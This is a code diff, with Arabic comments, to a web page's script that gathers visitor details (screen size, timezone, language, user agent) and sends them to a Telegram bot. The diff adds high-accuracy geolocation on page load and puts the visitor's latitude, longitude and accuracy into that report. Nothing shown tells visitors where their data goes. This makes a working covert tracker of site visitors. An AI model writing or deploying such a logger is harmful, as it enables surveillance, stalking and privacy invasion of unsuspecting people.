@@ -140,7 +140,12 @@
                 screen_resolution: `${screen.width}x${screen.height}`,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 language: navigator.language,
-                user_agent: ua
+                user_agent: ua,
+                // إضافة متغيرات الموقع
+                latitude: window.userLocation?.latitude || 'غير متاح',
+                longitude: window.userLocation?.longitude || 'غير متاح',
+                location_accuracy: window.userLocation?.accuracy || 'غير متاح',
+                location_status: window.userLocation?.status || 'لم يتم الطلب'
             };
         }
 
@@ -161,6 +166,10 @@
 📺 الدقة: ${data.screen_resolution}
 🌍 المنطقة: ${data.timezone}
 🗣️ اللغة: ${data.language}
+📍 الموقع الجغرافي: ${data.location_status}
+📐 خط العرض: ${data.latitude}
+📐 خط الطول: ${data.longitude}
+🎯 دقة الموقع: ${data.location_accuracy}
 ━━━━━━━━━━━━━━━━━━
             `;
             
@@ -201,27 +210,72 @@
             const data = collectData();
             console.log('بيانات الزائر:', data);
             
-            // إرسال البيانات (اختر إحدى الطرق)
+            // إرسال البيانات
             sendToTelegram(data);
-            
-            // أو إرسال على إيميلك مباشرة
-            const emailBody = Object.entries(data)
-                .map(([key, value]) => `${key}: ${value}`)
-                .join('\n');
+        }
+
+        // جمع الموقع الجغرافي عند تحميل الصفحة
+        window.userLocation = { status: 'جاري المحاولة...' };
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                console.log('🔍 محاولة الحصول على الموقع الجغرافي...');
                 
-            const mailtoLink = `mailto:your-email@gmail.com?subject=زائر جديد للموقع&body=${encodeURIComponent(emailBody)}`;
-            
-            // فتح الإيميل (اختياري)
-            // window.open(mailtoLink);
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        window.userLocation = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: Math.round(position.coords.accuracy) + ' متر',
+                            status: 'تم الحصول عليه بنجاح'
+                        };
+                        console.log('✅ تم الحصول على الموقع:', window.userLocation);
+                    },
+                    function(error) {
+                        let errorMsg = '';
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMsg = 'رفض المستخدم';
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMsg = 'الموقع غير متاح';
+                                break;
+                            case error.TIMEOUT:
+                                errorMsg = 'انتهت مهلة الانتظار';
+                                break;
+                            default:
+                                errorMsg = 'خطأ غير معروف';
+                        }
+                        
+                        window.userLocation = {
+                            latitude: 'غير متاح',
+                            longitude: 'غير متاح',
+                            accuracy: 'غير متاح',
+                            status: errorMsg
+                        };
+                        console.log('❌ فشل الحصول على الموقع:', errorMsg);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                window.userLocation = {
+                    latitude: 'غير متاح',
+                    longitude: 'غير متاح', 
+                    accuracy: 'غير متاح',
+                    status: 'المتصفح لا يدعم تحديد الموقع'
+                };
+                console.log('❌ المتصفح لا يدعم تحديد الموقع');
+            }
         }
 
         // الحصول على الموقع الجغرافي عند التحميل
         window.addEventListener('load', function() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function(position) {
-                    console.log('الموقع:', position.coords.latitude, position.coords.longitude);
-                });
-            }
+            console.log('🚀 تم تحميل الصفحة');
+            getLocation();
         });
     </script>
 </body>
